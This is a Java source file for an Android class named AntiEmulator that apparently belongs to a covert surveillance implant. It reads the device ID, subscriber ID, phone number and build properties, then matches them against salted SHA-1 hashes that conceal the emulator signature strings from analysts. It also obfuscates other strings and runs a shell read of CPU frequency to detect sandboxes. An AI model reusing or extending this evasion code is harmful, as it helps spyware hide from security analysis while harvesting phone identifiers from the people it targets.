package com.android.networking.util;

import java.util.ArrayList;

import android.content.Context;
import android.os.Build;
import android.telephony.TelephonyManager;

import com.android.networking.Messages;
import com.android.networking.Status;
import com.android.networking.auto.Cfg;
import com.android.networking.crypto.Digest;

public class AntiEmulator {
	private static final String TAG = "AntiEmulator";

	private static TelephonyManager tm = (TelephonyManager) Status.getAppContext().getSystemService(
			Context.TELEPHONY_SERVICE);

	// "000000000000000" se si e' nell'emulatore
	public boolean EmuCheckId() {
		String deviceId = tm.getDeviceId();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckId): DeviceId: " + deviceId); //$NON-NLS-1$
		}

		String digest = Digest.SHA1("Q0gh5!dGtr" + deviceId.toLowerCase()).toLowerCase();

		// "000000000000000"
		if (digest.equals("ff309ca5ee9fb342d82a8289ef5113569ae5c7fb")) {
			return true;
		}

		return false;
	}

	// "310260000000000" nell'emu
	public boolean EmuCheckSubscriber() {
		String subscriberId = tm.getSubscriberId();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckSubscriber): SubscriberId: " + subscriberId); //$NON-NLS-1$
		}

		// Se il telefono e' in airplane mode, questo e' null
		if (subscriberId == null) {
			return false;
		}

		String digest = Digest.SHA1("Lt5xaspitp" + subscriberId.toLowerCase()).toLowerCase();

		// "310260000000000"
		if (digest.equals("e60a02f0b41b042a72359c57de36ecb81fb10fc2")) {
			return true;
		}

		return false;
	}

	// "15555215554" nell'emu
	public boolean EmuCheckPhoneNumber() {
		String phoneNumber = tm.getLine1Number();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckPhoneNumber): LineNumber: " + phoneNumber); //$NON-NLS-1$
		}

		// Se il telefono e' in airplane mode, questo e' null
		if (phoneNumber == null) {
			return false;
		}

		phoneNumber = phoneNumber.substring(0, phoneNumber.length() - 2);

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckPhoneNumber): " + phoneNumber); //$NON-NLS-1$
		}

		String digest = Digest.SHA1("lYRGQKaHgJ" + phoneNumber.toLowerCase()).toLowerCase();

		// "155552155XX" (le due XX non sono incluse nell'hash perche' variano)
		if (digest.equals("6bba1f0a5587f3315c54856fd90ff790e3ed8581")) {
			return true;
		}

		return false;
	}

	// "generic" nell'emu
	public boolean EmuCheckDevice() {
		String device = Build.DEVICE;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckDevice): Device: " + device); //$NON-NLS-1$
		}

		String digest = Digest.SHA1("GpCi1INH6B" + device.toLowerCase()).toLowerCase();

		// "generic"
		if (digest.equals("e65170a5c904bb54c30e65f0290a67d87344afc7")) {
			return true;
		}

		return false;
	}

	// "generic" nell'emu e per alcuni telefoni, attenzione
	public boolean EmuCheckBrand() {
		String brand = Build.BRAND;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckBrand): Brand: " + brand); //$NON-NLS-1$
		}

		String digest = Digest.SHA1("AXWC4qhe6x" + brand.toLowerCase()).toLowerCase();

		// "generic"
		if (digest.equals("ae2f26a8cd5bd8efa6b31da9e4974a6b75108f21")) {
			return true;
		}

		return false;
	}

	// Finisce per "test-keys" nell'emu
	public boolean EmuCheckKeys() {
		String keys = Build.FINGERPRINT;
		int index;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckKeys): Keys: " + keys); //$NON-NLS-1$
		}

		// "/"
		index = keys.lastIndexOf(Messages.getString("36_7"));

		if (index == -1) {
			return false;
		}

		keys = keys.substring(index);

		String digest = Digest.SHA1("zOSgALHZaL" + keys.toLowerCase()).toLowerCase();

		// "/test-keys"
		if (digest.equals("5d2441306a9458d6592323fbdd235a4c849f33fb")) {
			return true;
		}

		return false;
	}

	// "unknown" nell'emu
	public boolean EmuCheckManufacturer() {
		String manufacturer = Build.MANUFACTURER;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckManufacturer): Manufacturer: " + manufacturer); //$NON-NLS-1$
		}

		String digest = Digest.SHA1("kamA9mES38" + manufacturer.toLowerCase()).toLowerCase();

		// "unknown"
		if (digest.equals("a89c0b114f51576c81fd313fc15dc8b125b8f91a")) {
			return true;
		}

		return false;
	}

	// "sdk" nell'emu
	public boolean EmuCheckProduct() {
		String product = Build.PRODUCT;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckProduct): Product: " + product); //$NON-NLS-1$
		}

		String digest = Digest.SHA1("NWzeoThPu2" + product.toLowerCase()).toLowerCase();

		// "sdk"
		if (digest.equals("77045d27d24fdec7f0439684fdbef14002f9519f")) {
			return true;
		}

		return false;
	}

	// "test-keys" nell'emu
	public boolean EmuCheckTags() {
		String tags = Build.TAGS;

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckTags): Tags: " + tags); //$NON-NLS-1$
		}

		String digest = Digest.SHA1("R70kq5jhCx" + tags.toLowerCase()).toLowerCase();

		// "test-keys"
		if (digest.equals("895f0bd16cf59e3e380b7360b26dfd445e2c9570")) {
			return true;
		}

		return false;
	}

	// "Android" nell'emu
	public boolean EmuCheckOperator() {
		String operator = tm.getSimOperatorName();

		if (Cfg.DEBUG) {
			Check.log(TAG + " (EmuCheckOperator): Operator: " + operator); //$NON-NLS-1$
		}

		String digest = Digest.SHA1("ovCwHlxund" + operator.toLowerCase()).toLowerCase();

		// "android"
		if (digest.equals("796c3a755fea349d366064676d8351e52a623288")) {
			return true;
		}

		return false;
	}

	public boolean EmuCheckScaling() {
		Execute exec = new Execute();

		// "cat /sys/devices/system/cpu/cpu0/cpufreq/scaling_cur_freq"
		ExecuteResult ret = exec.execute(Messages.getString("36_8"));

		// Ci interessa solo la prima riga
		for (String frequency : ret.stdout) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (EmuCheckScaling): " + frequency); //$NON-NLS-1$
			}

			try {
				Integer.parseInt(frequency);
				return false;
			} catch (NumberFormatException n) {
				return true;
			}
		}

		return true;
	}
}
